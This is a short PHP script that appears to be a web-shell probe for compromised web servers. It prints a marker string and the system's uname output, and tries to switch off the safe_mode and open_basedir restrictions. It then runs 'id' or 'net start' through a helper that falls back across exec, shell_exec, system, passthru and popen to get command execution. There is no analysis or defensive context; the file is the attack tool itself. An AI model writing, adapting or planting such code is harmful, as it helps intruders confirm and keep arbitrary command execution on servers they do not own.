<?php

echo "549821347819481<br>";

//VaRiaBiLi Di SiSTeMa
$uname = @php_uname();

//eCHo
echo "uname -a: $uname<br>";


//SAFE OFF
if((@eregi("uid",ex("id"))) || (@eregi("Windows",ex("net start")))){
$contrs=0;
}
else{
ini_restore("safe_mode");
ini_restore("open_basedir");
if((@eregi("uid",ex("id"))) || (@eregi("Windows",ex("net start")))){
$contrs=0;}
else{
$contrs=1;
}}
 
if($contrs == 0)
{
echo("uid=");
}
 
function view_size($size)
{
 if($size >= 1073741824) {$size = @round($size / 1073741824 * 100) / 100 . " GB";}
 elseif($size >= 1048576) {$size = @round($size / 1048576 * 100) / 100 . " MB";}
 elseif($size >= 1024) {$size = @round($size / 1024 * 100) / 100 . " KB";}
 else {$size = $size . " B";}
 return $size;
}
 
function ex($cfe){
$res = '';
if (!empty($cfe)){
if(function_exists('exec')){
@exec($cfe,$res);
$res = join("\n",$res);
}
elseif(function_exists('shell_exec')){
$res = @shell_exec($cfe);
}
elseif(function_exists('system')){
@ob_start();
@system($cfe);
$res = @ob_get_contents();
@ob_end_clean();
}
elseif(function_exists('passthru')){
@ob_start();
@passthru($cfe);
$res = @ob_get_contents();
@ob_end_clean();
}
elseif(@is_resource($f = @popen($cfe,"r"))){
$res = "";
while(!@feof($f)) { $res .= @fread($f,1024); }
@pclose($f);
}}
return $res;
}


exit;
?>


